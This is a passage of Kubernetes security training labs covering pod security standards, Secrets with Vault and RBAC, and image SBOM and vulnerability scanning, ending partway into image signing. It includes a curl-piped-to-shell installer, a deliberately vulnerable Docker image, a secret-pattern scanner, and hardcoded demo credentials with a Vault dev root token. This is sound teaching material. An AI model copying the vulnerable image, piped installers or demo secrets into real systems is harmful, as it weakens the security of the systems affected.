-  template:
-    metadata:
-      labels:
-        app: test-app
-    spec:
-      containers:
-      - name: app
-        image: nginx:1.21
-        ports:
-        - containerPort: 80
-        securityContext:
-          runAsUser: 1000
-EOF
-
-    Deploy to baseline namespace:
-
-kubectl apply -f test-deployment.yaml -n baseline-test
-
-    Deploy to restricted namespace:
-
-kubectl apply -f test-deployment.yaml -n restricted-test
-
-    Compare results:
-
-echo "=== Baseline Namespace ==="
-kubectl get pods -n baseline-test
-echo "=== Restricted Namespace ==="
-kubectl get pods -n restricted-test
-
-Subtask 5.2: Analyze Policy Violations
-
-Examine detailed information about policy violations.
-
-    Check events in both namespaces:
-
-echo "=== Baseline Namespace Events ==="
-kubectl get events -n baseline-test --sort-by='.lastTimestamp'
-echo "=== Restricted Namespace Events ==="
-kubectl get events -n restricted-test --sort-by='.lastTimestamp'
-
-    Get detailed pod descriptions:
-
-kubectl describe deployment test-app -n baseline-test
-kubectl describe deployment test-app -n restricted-test
-
-Task 6: Implement Security Best Practices
-Subtask 6.1: Create Secure Application Template
-
-Create a reusable template for secure pod deployments.
-
-    Create a secure application template:
-
-cat > secure-app-template.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: secure-web-app
-  namespace: restricted-test
-spec:
-  replicas: 3
-  selector:
-    matchLabels:
-      app: secure-web-app
-  template:
-    metadata:
-      labels:
-        app: secure-web-app
-    spec:
-      securityContext:
-        runAsNonRoot: true
-        runAsUser: 1001
-        runAsGroup: 1001
-        fsGroup: 1001
-        seccompProfile:
-          type: RuntimeDefault
-      containers:
-      - name: web
-        image: nginx:1.21-alpine
-        ports:
-        - containerPort: 8080
-        securityContext:
-          allowPrivilegeEscalation: false
-          readOnlyRootFilesystem: true
-          runAsNonRoot: true
-          runAsUser: 1001
-          runAsGroup: 1001
-          capabilities:
-            drop:
-            - ALL
-        resources:
-          requests:
-            memory: "64Mi"
-            cpu: "250m"
-          limits:
-            memory: "128Mi"
-            cpu: "500m"
-        volumeMounts:
-        - name: tmp-volume
-          mountPath: /tmp
-        - name: nginx-cache
-          mountPath: /var/cache/nginx
-        - name: nginx-run
-          mountPath: /var/run
-        livenessProbe:
-          httpGet:
-            path: /
-            port: 8080
-          initialDelaySeconds: 30
-          periodSeconds: 10
-        readinessProbe:
-          httpGet:
-            path: /
-            port: 8080
-          initialDelaySeconds: 5
-          periodSeconds: 5
-      volumes:
-      - name: tmp-volume
-        emptyDir: {}
-      - name: nginx-cache
-        emptyDir: {}
-      - name: nginx-run
-        emptyDir: {}
-EOF
-
-    Deploy the secure application:
-
-kubectl apply -f secure-app-template.yaml
-
-    Verify deployment:
-
-kubectl get deployment secure-web-app -n restricted-test
-kubectl get pods -l app=secure-web-app -n restricted-test
-
-Subtask 6.2: Test Application Functionality
-
-Verify that the secure application works correctly.
-
-    Check pod status and logs:
-
-kubectl get pods -l app=secure-web-app -n restricted-test
-kubectl logs -l app=secure-web-app -n restricted-test --tail=10
-
-    Create a service to test connectivity:
-
-cat > secure-app-service.yaml << 'EOF'
-apiVersion: v1
-kind: Service
-metadata:
-  name: secure-web-service
-  namespace: restricted-test
-spec:
-  selector:
-    app: secure-web-app
-  ports:
-  - port: 80
-    targetPort: 8080
-  type: ClusterIP
-EOF
-
-    Apply the service:
-
-kubectl apply -f secure-app-service.yaml
-
-    Test connectivity:
-
-kubectl run test-client --rm -i --tty --image=busybox --restart=Never -n restricted-test -- wget -qO- http://secure-web-service
-
-Task 7: Cleanup and Documentation
-Subtask 7.1: Document Findings
-
-Create a summary of your observations.
-
-    Create a findings document:
-
-cat > lab-findings.md << 'EOF'
-# Pod Security Standards Lab Findings
-
-## Baseline Policy Results
-- Compliant pods: [List successful deployments]
-- Blocked configurations: [List blocked attempts]
-- Key restrictions: [Summarize main restrictions]
-
-## Restricted Policy Results
-- Additional restrictions compared to Baseline: [List differences]
-- Required security contexts: [List mandatory settings]
-- Impact on existing workloads: [Describe compatibility issues]
-
-## Best Practices Identified
-1. Always set runAsNonRoot: true
-2. Drop all capabilities and add only necessary ones
-3. Use readOnlyRootFilesystem when possible
-4. Set resource limits and requests
-5. Implement proper health checks
-
-## Recommendations
-- [Your recommendations for production use]
-EOF
-
-    Review your findings:
-
-cat lab-findings.md
-
-Subtask 7.2: Clean Up Resources
-
-Remove the test resources created during the lab.
-
-    Delete test pods and deployments:
-
-kubectl delete pod --all -n baseline-test
-kubectl delete pod --all -n restricted-test
-kubectl delete deployment --all -n baseline-test
-kubectl delete deployment --all -n restricted-test
-
-    Delete services:
-
-kubectl delete service --all -n baseline-test
-kubectl delete service --all -n restricted-test
-
-    Delete test namespaces (optional):
-
-kubectl delete namespace baseline-test
-kubectl delete namespace restricted-test
-
-    Clean up configuration files:
-
-rm -f *.yaml *.md
-
-Troubleshooting Tips
-Common Issues and Solutions
-
-Issue: Pod creation fails with "violates PodSecurity" error Solution: Check the security context requirements for your target policy level and ensure all mandatory fields are set.
-
-Issue: Nginx fails to start in restricted environment Solution: Ensure you're using a non-root user and providing writable volumes for temporary files.
-
-Issue: Cannot determine if policy is enforced Solution: Check namespace labels and look for admission controller events in the cluster.
-
-Issue: Pod Security Standards not available Solution: Verify your Kubernetes version is 1.23+ and that the feature is enabled.
-Verification Commands
-
-Use these commands to verify your configuration:
-
-# Check namespace policy labels
-kubectl get namespace <namespace-name> -o yaml | grep pod-security
-
-# View admission controller events
-kubectl get events --all-namespaces | grep -i "violates\|denied"
-
-# Check pod security context
-kubectl get pod <pod-name> -o yaml | grep -A 20 securityContext
-
-Conclusion
-
-In this lab, you have successfully:
-
-• Configured Pod Security Standards at the namespace level, implementing both Baseline and Restricted policies • Tested various security contexts and observed how different policies enforce security requirements • Identified the differences between Baseline and Restricted security standards through hands-on experimentation • Created secure application templates that comply with strict security policies • Implemented security best practices including non-root execution, capability dropping, and read-only filesystems
-
-Why This Matters: Pod Security Standards provide a standardized way to enforce security policies across Kubernetes clusters. Understanding these standards is crucial for:
-
-    Production Security: Ensuring workloads meet organizational security requirements
-    Compliance: Meeting regulatory and industry security standards
-    Risk Mitigation: Reducing the attack surface of containerized applications
-    Operational Excellence: Implementing consistent security practices across teams
-
-The skills you've developed in this lab are essential for the Certified Kubernetes Security Specialist (CKS) certification and for implementing robust security practices in production Kubernetes environments. You now understand how to balance security requirements with application functionality, a critical skill for Kubernetes administrators and security professionals.
-
-
-
-
-
-Lab 5: Securing Kubernetes Secrets
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Create and manage Kubernetes Secrets using different methods • Mount Secrets as environment variables and volumes in Pods • Integrate HashiCorp Vault with Kubernetes for external secrets management • Verify that Secrets are encrypted at rest in etcd • Implement secure access patterns for sensitive data in workloads • Configure RBAC policies for Secret access control • Understand best practices for secrets management in Kubernetes
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with YAML configuration files • Basic knowledge of Linux command line operations • Understanding of encryption concepts and security principles • Previous experience with kubectl commands
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with Kubernetes pre-installed. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.
-
-Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-configured • Single-node Kubernetes cluster (minikube) • HashiCorp Vault binary pre-installed • All necessary tools and dependencies
-Task 1: Creating and Managing Kubernetes Secrets
-Subtask 1.1: Create Secrets Using Different Methods
-
-First, let's explore various ways to create Kubernetes Secrets.
-
-Step 1: Verify your Kubernetes cluster is running
-
-kubectl cluster-info
-kubectl get nodes
-
-Step 2: Create a Secret using the imperative command method
-
-# Create a generic secret with username and password
-kubectl create secret generic user-credentials \
-  --from-literal=username=admin \
-  --from-literal=password=supersecret123
-
-# Verify the secret was created
-kubectl get secrets
-kubectl describe secret user-credentials
-
-Step 3: Create a Secret from files
-
-# Create files with sensitive data
-echo -n 'admin' > username.txt
-echo -n 'supersecret123' > password.txt
-
-# Create secret from files
-kubectl create secret generic file-credentials \
-  --from-file=username.txt \
-  --from-file=password.txt
-
-# Clean up the files
-rm username.txt password.txt
-
-Step 4: Create a Secret using YAML manifest
-
-Create a file named database-secret.yaml:
-
-apiVersion: v1
-kind: Secret
-metadata:
-  name: database-secret
-  namespace: default
-type: Opaque
-data:
-  # Base64 encoded values
-  db-host: bXlzcWwtc2VydmVy  # mysql-server
-  db-user: ZGJhZG1pbg==      # dbadmin
-  db-password: bXlwYXNzd29yZA==  # mypassword
-
-Apply the Secret:
-
-kubectl apply -f database-secret.yaml
-kubectl get secret database-secret -o yaml
-
-Step 5: Create a TLS Secret for HTTPS
-
-# Generate a self-signed certificate
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-  -keyout tls.key -out tls.crt \
-  -subj "/CN=myapp.example.com/O=myapp"
-
-# Create TLS secret
-kubectl create secret tls tls-secret \
-  --cert=tls.crt \
-  --key=tls.key
-
-# Clean up certificate files
-rm tls.key tls.crt
-
-Subtask 1.2: Mount Secrets as Environment Variables
-
-Step 1: Create a Pod that uses Secrets as environment variables
-
-Create a file named pod-env-secrets.yaml:
-
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secret-env-pod
-spec:
-  containers:
-  - name: myapp
-    image: nginx:1.21
-    env:
-    - name: DB_USERNAME
-      valueFrom:
-        secretKeyRef:
-          name: user-credentials
-          key: username
-    - name: DB_PASSWORD
-      valueFrom:
-        secretKeyRef:
-          name: user-credentials
-          key: password
-    - name: DATABASE_HOST
-      valueFrom:
-        secretKeyRef:
-          name: database-secret
-          key: db-host
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do echo 'Username: '$DB_USERNAME; echo 'Host: '$DATABASE_HOST; sleep 30; done"]
-
-Step 2: Deploy and test the Pod
-
-kubectl apply -f pod-env-secrets.yaml
-
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/secret-env-pod --timeout=60s
-
-# Check the environment variables
-kubectl logs secret-env-pod
-kubectl exec secret-env-pod -- env | grep -E "(DB_|DATABASE_)"
-
-Subtask 1.3: Mount Secrets as Volumes
-
-Step 1: Create a Pod that mounts Secrets as volumes
-
-Create a file named pod-volume-secrets.yaml:
-
-apiVersion: v1
-kind: Pod
-metadata:
-  name: secret-volume-pod
-spec:
-  containers:
-  - name: myapp
-    image: nginx:1.21
-    volumeMounts:
-    - name: secret-volume
-      mountPath: "/etc/secrets"
-      readOnly: true
-    - name: tls-volume
-      mountPath: "/etc/tls"
-      readOnly: true
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do ls -la /etc/secrets/; ls -la /etc/tls/; sleep 30; done"]
-  volumes:
-  - name: secret-volume
-    secret:
-      secretName: user-credentials
-  - name: tls-volume
-    secret:
-      secretName: tls-secret
-
-Step 2: Deploy and verify the volume mounts
-
-kubectl apply -f pod-volume-secrets.yaml
-
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/secret-volume-pod --timeout=60s
-
-# Check the mounted secrets
-kubectl exec secret-volume-pod -- ls -la /etc/secrets/
-kubectl exec secret-volume-pod -- cat /etc/secrets/username
-kubectl exec secret-volume-pod -- ls -la /etc/tls/
-
-Task 2: Integrating HashiCorp Vault for External Secrets Management
-Subtask 2.1: Set Up HashiCorp Vault in Development Mode
-
-Step 1: Start Vault server in development mode
-
-# Start Vault in development mode (in background)
-vault server -dev -dev-root-token-id=myroot -dev-listen-address=0.0.0.0:8200 &
-
-# Wait for Vault to start
-sleep 5
-
-# Set environment variables
-export VAULT_ADDR='http://127.0.0.1:8200'
-export VAULT_TOKEN='myroot'
-
-# Verify Vault is running
-vault status
-
-Step 2: Enable and configure the KV secrets engine
-
-# Enable KV v2 secrets engine
-vault secrets enable -path=secret kv-v2
-
-# Store some secrets
-vault kv put secret/myapp/config \
-  username=vaultuser \
-  password=vaultpass123 \
-  api_key=abc123xyz789
-
-vault kv put secret/myapp/database \
-  host=vault-db.example.com \
-  port=5432 \
-  database=myappdb
-
-# Verify secrets are stored
-vault kv get secret/myapp/config
-vault kv get secret/myapp/database
-
-Subtask 2.2: Configure Kubernetes Authentication in Vault
-
-Step 1: Enable Kubernetes authentication
-
-# Enable Kubernetes auth method
-vault auth enable kubernetes
-
-# Get Kubernetes cluster information
-KUBE_CA_CERT=$(kubectl config view --raw --minify --flatten -o jsonpath='{.clusters[].cluster.certificate-authority-data}' | base64 --decode)
-KUBE_HOST=$(kubectl config view --raw --minify --flatten -o jsonpath='{.clusters[].cluster.server}')
-
-# Configure Kubernetes authentication
-vault write auth/kubernetes/config \
-  token_reviewer_jwt="$(kubectl create token default)" \
-  kubernetes_host="$KUBE_HOST" \
-  kubernetes_ca_cert="$KUBE_CA_CERT"
-
-Step 2: Create Vault policies and roles
-
-# Create a policy for reading secrets
-vault policy write myapp-policy - <<EOF
-path "secret/data/myapp/*" {
-  capabilities = ["read"]
-}
-EOF
-
-# Create a Kubernetes role
-vault write auth/kubernetes/role/myapp \
-  bound_service_account_names=vault-auth \
-  bound_service_account_namespaces=default \
-  policies=myapp-policy \
-  ttl=1h
-
-Subtask 2.3: Deploy Vault Agent for Secret Injection
-
-Step 1: Create a ServiceAccount for Vault authentication
-
-kubectl create serviceaccount vault-auth
-
-Step 2: Create a ConfigMap for Vault Agent configuration
-
-Create a file named vault-agent-config.yaml:
-
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: vault-agent-config
-data:
-  vault-agent.hcl: |
-    vault {
-      address = "http://127.0.0.1:8200"
-    }
-    
-    auto_auth {
-      method "kubernetes" {
-        mount_path = "auth/kubernetes"
-        config = {
-          role = "myapp"
-        }
-      }
-      
-      sink "file" {
-        config = {
-          path = "/vault/secrets/token"
-        }
-      }
-    }
-    
-    template {
-      source      = "/vault/config/app-config.tpl"
-      destination = "/vault/secrets/app-config"
-    }
-  
-  app-config.tpl: |
-    {{- with secret "secret/data/myapp/config" -}}
-    USERNAME={{ .Data.data.username }}
-    PASSWORD={{ .Data.data.password }}
-    API_KEY={{ .Data.data.api_key }}
-    {{- end }}
-    {{- with secret "secret/data/myapp/database" -}}
-    DB_HOST={{ .Data.data.host }}
-    DB_PORT={{ .Data.data.port }}
-    DB_NAME={{ .Data.data.database }}
-    {{- end }}
-
-Apply the ConfigMap:
-
-kubectl apply -f vault-agent-config.yaml
-
-Step 3: Create a Pod with Vault Agent sidecar
-
-Create a file named vault-sidecar-pod.yaml:
-
-apiVersion: v1
-kind: Pod
-metadata:
-  name: vault-sidecar-pod
-spec:
-  serviceAccountName: vault-auth
-  containers:
-  - name: vault-agent
-    image: vault:1.15.2
-    command: ["vault", "agent", "-config=/vault/config/vault-agent.hcl"]
-    volumeMounts:
-    - name: vault-config
-      mountPath: /vault/config
-    - name: vault-secrets
-      mountPath: /vault/secrets
-    env:
-    - name: VAULT_ADDR
-      value: "http://127.0.0.1:8200"
-  
-  - name: myapp
-    image: nginx:1.21
-    command: ["/bin/sh"]
-    args: ["-c", "while true; do echo '=== Vault Secrets ==='; cat /vault/secrets/app-config 2>/dev/null || echo 'Secrets not ready yet'; sleep 10; done"]
-    volumeMounts:
-    - name: vault-secrets
-      mountPath: /vault/secrets
-      readOnly: true
-  
-  volumes:
-  - name: vault-config
-    configMap:
-      name: vault-agent-config
-  - name: vault-secrets
-    emptyDir: {}
-
-Step 4: Deploy and verify the Vault integration
-
-kubectl apply -f vault-sidecar-pod.yaml
-
-# Wait for pod to be ready
-kubectl wait --for=condition=Ready pod/vault-sidecar-pod --timeout=120s
-
-# Check the logs to see secrets being retrieved
-kubectl logs vault-sidecar-pod -c myapp
-kubectl logs vault-sidecar-pod -c vault-agent
-
-Task 3: Verifying Secrets Encryption at Rest
-Subtask 3.1: Check etcd Encryption Configuration
-
-Step 1: Examine the Kubernetes API server configuration
-
-# Check if encryption at rest is enabled (in minikube)
-kubectl get pods -n kube-system | grep kube-apiserver
-
-# Get the API server configuration
-kubectl describe pod -n kube-system $(kubectl get pods -n kube-system | grep kube-apiserver | awk '{print $1}')
-
-Step 2: Create an encryption configuration for demonstration
-
-Create a file named encryption-config.yaml:
-
-apiVersion: apiserver.config.k8s.io/v1
-kind: EncryptionConfiguration
-resources:
-- resources:
-  - secrets
-  providers:
-  - aescbc:
-      keys:
-      - name: key1
-        secret: c2VjcmV0IGlzIHNlY3VyZQ==
-  - identity: {}
-
-Note: In a production environment, you would configure this in the API server startup parameters.
-Subtask 3.2: Verify Secret Storage and Access
-
-Step 1: Create a test secret and examine its storage
-
-# Create a test secret
-kubectl create secret generic test-encryption \
-  --from-literal=data="This is sensitive information"
-
-# Get the secret in different formats
-kubectl get secret test-encryption -o yaml
-kubectl get secret test-encryption -o jsonpath='{.data.data}' | base64 --decode
-
-Step 2: Implement RBAC for Secret access control
-
-Create a file named secret-rbac.yaml:
-
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: secret-reader
-  namespace: default
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: Role
-metadata:
-  namespace: default
-  name: secret-reader-role
-rules:
-- apiGroups: [""]
-  resources: ["secrets"]
-  verbs: ["get", "list"]
-  resourceNames: ["user-credentials", "database-secret"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: RoleBinding
-metadata:
-  name: secret-reader-binding
-  namespace: default
-subjects:
-- kind: ServiceAccount
-  name: secret-reader
-  namespace: default
-roleRef:
-  kind: Role
-  name: secret-reader-role
-  apiGroup: rbac.authorization.k8s.io
-
-Apply the RBAC configuration:
-
-kubectl apply -f secret-rbac.yaml
-
-Step 3: Test RBAC restrictions
-
-# Test access with the service account
-kubectl auth can-i get secrets --as=system:serviceaccount:default:secret-reader
-kubectl auth can-i get secret/user-credentials --as=system:serviceaccount:default:secret-reader
-kubectl auth can-i delete secrets --as=system:serviceaccount:default:secret-reader
-
-Subtask 3.3: Implement Secret Rotation
-
-Step 1: Create a script for secret rotation
-
-Create a file named rotate-secret.sh:
-
-#!/bin/bash
-
-SECRET_NAME="user-credentials"
-NEW_PASSWORD=$(openssl rand -base64 32)
-
-echo "Rotating password for secret: $SECRET_NAME"
-echo "New password: $NEW_PASSWORD"
-
-# Update the secret
-kubectl patch secret $SECRET_NAME -p="{\"data\":{\"password\":\"$(echo -n $NEW_PASSWORD | base64 -w 0)\"}}"
-
-echo "Secret rotation completed"
-kubectl get secret $SECRET_NAME -o jsonpath='{.data.password}' | base64 --decode
-echo ""
-
-Make it executable and run:
-
-chmod +x rotate-secret.sh
-./rotate-secret.sh
-
-Step 2: Verify the rotation worked
-
-# Check if pods using the secret need to be restarted
-kubectl get pods -o wide
-
-# Restart pods to pick up new secret values
-kubectl delete pod secret-env-pod secret-volume-pod
-kubectl apply -f pod-env-secrets.yaml
-kubectl apply -f pod-volume-secrets.yaml
-
-# Verify new secret values are being used
-kubectl wait --for=condition=Ready pod/secret-env-pod --timeout=60s
-kubectl exec secret-env-pod -- env | grep DB_PASSWORD
-
-Task 4: Advanced Security Practices
-Subtask 4.1: Implement Secret Scanning
-
-Step 1: Create a script to scan for potential secret leaks
-
-Create a file named secret-scanner.sh:
-
-#!/bin/bash
-
-echo "Scanning for potential secret leaks..."
-
-# Check for secrets in environment variables
-echo "=== Checking environment variables ==="
-kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{range .spec.containers[*]}{.env[*].name}{": "}{.env[*].value}{"\n"}{end}{"\n"}{end}' | grep -i -E "(password|secret|key|token)" || echo "No plain text secrets found in env vars"
-
-# Check for secrets in pod specifications
-echo "=== Checking pod specifications ==="
-kubectl get pods -o yaml | grep -i -E "(password|secret|key|token):" | grep -v "secretKeyRef" || echo "No plain text secrets found in pod specs"
-
-echo "Secret scan completed"
-
-Make it executable and run:
-
-chmod +x secret-scanner.sh
-./secret-scanner.sh
-
-Subtask 4.2: Monitor Secret Access
-
-Step 1: Enable audit logging for secrets (demonstration)
-
-Create a file named audit-policy.yaml:
-
-apiVersion: audit.k8s.io/v1
-kind: Policy
-rules:
-- level: Metadata
-  resources:
-  - group: ""
-    resources: ["secrets"]
-  verbs: ["get", "list", "create", "update", "patch", "delete"]
-
-Step 2: Create a monitoring script
-
-Create a file named monitor-secrets.sh:
-
-#!/bin/bash
-
-echo "Monitoring secret access patterns..."
-
-# List all secrets and their age
-echo "=== Current Secrets ==="
-kubectl get secrets -o custom-columns=NAME:.metadata.name,AGE:.metadata.creationTimestamp
-
-# Check which pods are using secrets
-echo "=== Pods using secrets ==="
-kubectl get pods -o yaml | grep -A 5 -B 5 secretKeyRef
-
-# List service accounts with secret access
-echo "=== Service accounts with secret access ==="
-kubectl get rolebindings -o yaml | grep -A 10 -B 5 secrets
-
-echo "Monitoring completed"
-
-Make it executable and run:
-
-chmod +x monitor-secrets.sh
-./monitor-secrets.sh
-
-Verification and Testing
-Step 1: Comprehensive Secret Verification
-
-# Verify all secrets are created and accessible
-echo "=== Verifying all secrets ==="
-kubectl get secrets
-
-# Test environment variable access
-kubectl exec secret-env-pod -- printenv | grep -E "(DB_|DATABASE_)"
-
-# Test volume mount access
-kubectl exec secret-volume-pod -- find /etc/secrets -type f -exec echo "File: {}" \; -exec cat {} \;
-
-# Test Vault integration
-kubectl logs vault-sidecar-pod -c myapp | tail -10
-
-Step 2: Security Validation
-
-# Verify RBAC is working
-kubectl auth can-i create secrets --as=system:serviceaccount:default:secret-reader
-kubectl auth can-i get secrets --as=system:serviceaccount:default:secret-reader
-
-# Check for any security issues
-kubectl get pods --all-namespaces -o yaml | grep -i "privileged\|hostNetwork\|hostPID" || echo "No obvious security issues found"
-
-Cleanup
-
-# Stop Vault server
-pkill vault
-
-# Delete all created resources
-kubectl delete pod secret-env-pod secret-volume-pod vault-sidecar-pod
-kubectl delete secret user-credentials file-credentials database-secret tls-secret test-encryption
-kubectl delete configmap vault-agent-config
-kubectl delete serviceaccount vault-auth secret-reader
-kubectl delete role secret-reader-role
-kubectl delete rolebinding secret-reader-binding
-
-# Remove created files
-rm -f database-secret.yaml pod-env-secrets.yaml pod-volume-secrets.yaml
-rm -f vault-agent-config.yaml vault-sidecar-pod.yaml secret-rbac.yaml
-rm -f encryption-config.yaml audit-policy.yaml
-rm -f rotate-secret.sh secret-scanner.sh monitor-secrets.sh
-
-Troubleshooting Tips
-Common Issues and Solutions
-
-Issue 1: Vault server fails to start
-
-    Solution: Check if port 8200 is already in use: netstat -tlnp | grep 8200
-    Kill any existing processes and restart Vault
-
-Issue 2: Pods cannot access secrets
-
-    Solution: Verify secret names and keys match exactly in pod specifications
-    Check RBAC permissions for the service account
-
-Issue 3: Base64 encoding issues
-
-    Solution: Use echo -n to avoid newline characters when encoding
-    Verify encoding with: echo "value" | base64 | base64 --decode
-
-Issue 4: Vault authentication fails
-
-    Solution: Ensure the service account token is valid
-    Check Kubernetes API server accessibility from Vault
-
-Conclusion
-
-In this comprehensive lab, you have successfully:
-
-• Created and managed Kubernetes Secrets using multiple methods including imperative commands, file-based creation, and YAML manifests • Implemented secure secret consumption by mounting secrets as both environment variables and volumes in pods • Integrated HashiCorp Vault as an external secrets management solution with Kubernetes authentication • Verified encryption at rest and implemented proper RBAC controls for secret access • Established security best practices including secret rotation, scanning, and monitoring
-Key Takeaways
-
-Security Best Practices: You learned that secrets should never be stored in plain text and should always be encrypted both at rest and in transit. The integration with external tools like Vault provides enterprise-grade secrets management capabilities.
-
-Operational Excellence: The lab demonstrated how to implement proper secret lifecycle management, including creation, rotation, and monitoring, which are essential for maintaining security in production environments.
-
-Compliance and Auditing: By implementing RBAC controls and monitoring capabilities, you've established the foundation for meeting compliance requirements and maintaining audit trails for secret access.
-
-This knowledge is crucial for the Certified Kubernetes Security Specialist (CKS) certification and real-world Kubernetes security implementations. The skills you've developed will help you secure sensitive data in containerized applications and meet enterprise security requirements.
-Next Steps
-
-Consider exploring advanced topics such as: • Implementing secrets management with other tools like AWS Secrets Manager or Azure Key Vault • Setting up automated secret rotation with operators • Integrating secrets management with CI/CD pipelines • Implementing zero-trust security models for Kubernetes workloads
-
-
-
-
-
-Lab 6: Supply Chain Security
-Objectives
-
-By the end of this lab, you will be able to:
-
-• Generate and analyze Software Bill of Materials (SBOM) for container images to understand dependencies • Scan container images for security vulnerabilities using Trivy • Sign container images with Cosign for authenticity verification • Configure Kubernetes admission controllers to enforce signed image policies • Implement supply chain security best practices in containerized environments
-Prerequisites
-
-Before starting this lab, you should have:
-
-• Basic understanding of Docker containers and container images • Familiarity with Kubernetes concepts (pods, deployments, admission controllers) • Knowledge of Linux command line operations • Understanding of public key cryptography concepts • Basic knowledge of YAML configuration files
-Lab Environment
-
-Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment. No need to build your own VM or install additional software - everything is ready to go!
-
-Your lab environment includes: • Ubuntu 22.04 LTS with Docker installed • Kubernetes cluster (kind) pre-configured • All required tools pre-installed: Trivy, Cosign, Syft, kubectl
-Task 1: Generate and Analyze Software Bill of Materials (SBOM)
-Subtask 1.1: Understanding SBOM Concepts
-
-A Software Bill of Materials (SBOM) is a comprehensive inventory of all components, libraries, and dependencies used in a software application. Think of it like an ingredient list on food packaging - it tells you exactly what's inside your container image.
-Subtask 1.2: Install and Configure Syft
-
-First, let's verify that Syft is available in your environment:
-
-# Check if Syft is installed
-syft version
-
-# If not installed, install it
-curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
-
-Subtask 1.3: Pull a Sample Container Image
-
-Let's work with a popular application image:
-
-# Pull a sample application image
-docker pull nginx:1.24-alpine
-
-# Verify the image is available
-docker images | grep nginx
-
-Subtask 1.4: Generate SBOM for the Container Image
-
-Now let's generate an SBOM for our nginx image:
-
-# Generate SBOM in SPDX format
-syft nginx:1.24-alpine -o spdx-json > nginx-sbom.spdx.json
-
-# Generate SBOM in CycloneDX format
-syft nginx:1.24-alpine -o cyclonedx-json > nginx-sbom.cyclonedx.json
-
-# Generate human-readable table format
-syft nginx:1.24-alpine -o table > nginx-sbom.txt
-
-Subtask 1.5: Analyze the Generated SBOM
-
-Let's examine what's inside our container:
-
-# View the human-readable SBOM
-cat nginx-sbom.txt
-
-# Count the number of packages
-cat nginx-sbom.txt | wc -l
-
-# Look for specific package types
-echo "=== Alpine Packages ==="
-syft nginx:1.24-alpine -o table | grep "apk"
-
-echo "=== Examining JSON SBOM structure ==="
-jq '.packages[0:3]' nginx-sbom.spdx.json
-
-Subtask 1.6: Generate SBOM for a More Complex Application
-
-Let's try with a more complex application:
-
-# Pull a Python application image
-docker pull python:3.11-slim
-
-# Generate SBOM for Python image
-syft python:3.11-slim -o table > python-sbom.txt
-
-# Compare package counts
-echo "Nginx packages:"
-cat nginx-sbom.txt | wc -l
-echo "Python packages:"
-cat python-sbom.txt | wc -l
-
-# Look at Python-specific packages
-syft python:3.11-slim -o table | grep -E "(python|pip)"
-
-Task 2: Vulnerability Scanning with Trivy
-Subtask 2.1: Understanding Container Vulnerability Scanning
-
-Trivy is a comprehensive security scanner that detects vulnerabilities in container images, filesystems, and Git repositories. It's like having a security guard that checks every component in your container for known security issues.
-Subtask 2.2: Basic Vulnerability Scanning
-
-Let's scan our nginx image for vulnerabilities:
-
-# Scan nginx image for vulnerabilities
-trivy image nginx:1.24-alpine
-
-# Scan with specific severity levels only
-trivy image --severity HIGH,CRITICAL nginx:1.24-alpine
-
-# Generate JSON report
-trivy image -f json -o nginx-vuln-report.json nginx:1.24-alpine
-
-Subtask 2.3: Detailed Vulnerability Analysis
-
-Let's get more detailed information about vulnerabilities:
-
-# Scan with more verbose output
-trivy image --format table --severity HIGH,CRITICAL nginx:1.24-alpine
-
-# Check for specific vulnerability types
-trivy image --vuln-type os nginx:1.24-alpine
-
-# Scan for both OS and library vulnerabilities
-trivy image --vuln-type os,library python:3.11-slim
-
-Subtask 2.4: Create a Custom Vulnerable Image
-
-Let's create an intentionally vulnerable image to see Trivy in action:
-
-# Create a Dockerfile with an older, vulnerable base image
-cat > Dockerfile.vulnerable << 'EOF'
-FROM ubuntu:18.04
-RUN apt-get update && apt-get install -y \
-    curl \
-    wget \
-    openssl=1.1.1-1ubuntu2.1~18.04.20 \
-    && rm -rf /var/lib/apt/lists/*
-COPY app.py /app/
-WORKDIR /app
-CMD ["python3", "app.py"]
-EOF
-
-# Create a simple Python app
-cat > app.py << 'EOF'
-#!/usr/bin/env python3
-print("Hello from vulnerable container!")
-EOF
-
-# Build the vulnerable image
-docker build -f Dockerfile.vulnerable -t vulnerable-app:latest .
-
-# Scan the vulnerable image
-trivy image --severity HIGH,CRITICAL vulnerable-app:latest
-
-Subtask 2.5: Compare Vulnerability Reports
-
-Let's compare different images:
-
-# Scan multiple images and compare
-echo "=== Scanning Alpine-based nginx ==="
-trivy image --severity HIGH,CRITICAL --quiet nginx:1.24-alpine | wc -l
-
-echo "=== Scanning Ubuntu-based vulnerable app ==="
-trivy image --severity HIGH,CRITICAL --quiet vulnerable-app:latest | wc -l
-
-# Generate comparison report
-trivy image --format json nginx:1.24-alpine > nginx-scan.json
-trivy image --format json vulnerable-app:latest > vulnerable-scan.json
-
-# Count vulnerabilities in each
-echo "Nginx HIGH/CRITICAL vulnerabilities:"
-jq '[.Results[]?.Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length' nginx-scan.json
-
-echo "Vulnerable app HIGH/CRITICAL vulnerabilities:"
-jq '[.Results[]?.Vulnerabilities[]? | select(.Severity == "HIGH" or .Severity == "CRITICAL")] | length' vulnerable-scan.json
-
-Task 3: Image Signing with Cosign
-Subtask 3.1: Understanding Image Signing
-
-Image signing is like putting a tamper-evident seal on your container images. It ensures that the image you're running is exactly what the publisher intended, without any malicious modifications.
-Subtask 3.2: Generate Signing Keys
-
-Let's create a key pair for signing images:
-
